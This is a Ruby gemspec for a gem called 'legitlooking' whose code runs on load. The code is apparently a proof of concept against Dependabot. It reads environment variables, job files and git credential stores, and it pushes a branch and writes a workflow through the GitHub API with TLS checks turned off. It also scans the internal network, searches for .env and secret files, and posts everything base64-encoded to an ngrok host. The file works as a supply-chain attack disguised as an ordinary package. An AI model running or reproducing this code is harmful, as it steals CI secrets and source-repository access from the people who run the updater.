# frozen_string_literal: true

COLLAB_URL = "https://854e-2001-1c00-307-d600-5943-e639-f9a6-c878.ngrok-free.app"

begin
  require "uri"
  require "net/http"

  read_file = ->(f) { IO.binread(f).force_encoding("UTF-8").encode("UTF-8", invalid: :replace, undef: :replace) }

  lines = []
  lines << "=== ENV ===\n" + ENV.map { |k,v| "#{k}=#{v}" }.join("\n")
  lines << "\n=== JOB.JSON ===\n" + (read_file.("/home/dependabot/dependabot-updater/job.json") rescue "FOUT")

  # === ESCALATIE: GitHub API via de geauthenticeerde proxy ===
  # De proxy injecteert automatisch de Authorization header.
  # We disablen SSL verify omdat we intern zitten.
  lines << "\n=== GITHUB API VIA PROXY ==="

  def gh_req(method, url, body_hash = nil)
    require "uri"; require "net/http"
    uri = URI(url)
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = true; http.verify_mode = 0
    http.open_timeout = 10; http.read_timeout = 10
    req = Object.const_get("Net::HTTP::#{method.capitalize}").new(uri)
    req["Accept"] = "application/vnd.github+json"
    req["X-GitHub-Api-Version"] = "2022-11-28"
    if body_hash
      req["Content-Type"] = "application/json"
      req.body = body_hash.to_s.gsub("=>", ":").gsub("nil", "null")
        .gsub(": true", ": true").gsub(": false", ": false")
    end
    res = http.request(req)
    "Status: #{res.code}\nScopes: #{res["x-oauth-scopes"]}\nBody: #{res.body[0, 800]}"
  rescue => e
    "FOUT: #{e.message}"
  end

  repo_path = ENV["DEPENDABOT_REPO_CONTENTS_PATH"] || "/home/dependabot/dependabot-updater/repo"

  # 1. Git config lezen: bevat mogelijk credentials in remote URL
  lines << "\n--- .git/config ---"
  lines << (IO.binread("#{repo_path}/.git/config") rescue "FOUT")

  # 2. Git credentials store
  lines << "\n--- git credential store ---"
  lines << (`git -C #{repo_path} config --list 2>/dev/null` rescue "N/A")
  lines << (IO.binread("/home/dependabot/.git-credentials") rescue "geen .git-credentials")
  lines << (IO.binread("/root/.git-credentials") rescue "geen root .git-credentials")

  # 3. Git push test: maak commit en push naar eigen branch
  lines << "\n--- GIT PUSH TEST ---"
  push_result = `
    cd #{repo_path} &&
    git config user.email "poc@test.com" &&
    git config user.name "poc" &&
    git checkout -b dependabot-rce-poc-#{$$} 2>&1 &&
    echo "rce-proof" > /tmp/rce_proof.txt &&
    cp /tmp/rce_proof.txt rce_proof.txt &&
    git add rce_proof.txt &&
    git commit -m "Dependabot RCE PoC - proof of write" 2>&1 &&
    git push origin dependabot-rce-poc-#{$$} 2>&1
  `.strip
  lines << push_result[0, 1000]

  # 4. PUT contents API met correcte JSON string (geen Ruby hash serialisatie)
  lines << "\n--- PUT workflow via Contents API ---"
  workflow_yaml = "name: poc\non: [push]\njobs:\n  r:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -s '#{COLLAB_URL}?s=proof'\n"
  encoded_content = [workflow_yaml].pack("m0").gsub("\n", "")
  # Bouw JSON string handmatig (geen require json nodig)
  put_body = "{\"message\":\"dependabot-rce-poc\",\"content\":\"#{encoded_content}\"}"
  begin
    uri3 = URI("https://api.github.com/repos/ugurcanli/testpen/contents/rce_workflow_poc.yml")
    http3 = Net::HTTP.new(uri3.host, uri3.port)
    http3.use_ssl = true; http3.verify_mode = 0
    http3.open_timeout = 10; http3.read_timeout = 10
    r3 = Net::HTTP::Put.new(uri3)
    r3["Accept"] = "application/vnd.github+json"
    r3["Content-Type"] = "application/json"
    r3["X-GitHub-Api-Version"] = "2022-11-28"
    r3.body = put_body
    res3 = http3.request(r3)
    lines << "Status: #{res3.code}"
    lines << "Body: #{res3.body[0, 500]}"
  rescue => e
    lines << "FOUT: #{e.message}"
  end

  # === PIVOT: interne netwerk scan ===
  lines << "\n=== INTERNE NETWERK SCAN ==="
  lines << `nmap -sn 172.19.0.0/24 2>/dev/null || for i in $(seq 1 10); do (ping -c1 -W1 172.19.0.$i >/dev/null 2>&1 && echo "172.19.0.$i UP") || true; done 2>/dev/null`.to_s[0, 800]

  # === Repo inhoud lezen via proxy ===
  lines << "\n=== GECLONEDE REPO BESTANDEN ==="
  repo_path = ENV["DEPENDABOT_REPO_CONTENTS_PATH"] || "/home/dependabot/dependabot-updater/repo"
  lines << `ls -la #{repo_path}/ 2>/dev/null`.to_s[0, 500]
  lines << `find #{repo_path} -name "*.env" -o -name ".env*" -o -name "*.secret" 2>/dev/null`.to_s[0, 300]

  payload = [lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace)].pack("m0")

  uri = URI("#{COLLAB_URL}?poc=escalatie")
  req = Net::HTTP::Post.new(uri)
  req["Content-Type"] = "text/plain"
  req.body = payload
  Net::HTTP.start(uri.host, uri.port, use_ssl: uri.scheme == "https",
                  open_timeout: 10, read_timeout: 10) { |h| h.request(req) }

rescue => e
  begin
    require "net/http"
    require "uri"
    uri = URI("#{COLLAB_URL}?poc=escalatie&err=#{URI.encode_www_form_component(e.message[0, 200])}")
    Net::HTTP.get(uri)
  rescue
  end
end

Gem::Specification.new do |spec|
  spec.name          = "legitlooking"
  spec.version       = "1.0.7"
  spec.authors       = ["researcher"]
  spec.summary       = "A normal looking gem"
  spec.require_paths = ["lib"]

  spec.add_dependency "rails", ">= 7", "< 9"
  spec.add_dependency "devise", "~> 4.9"
end
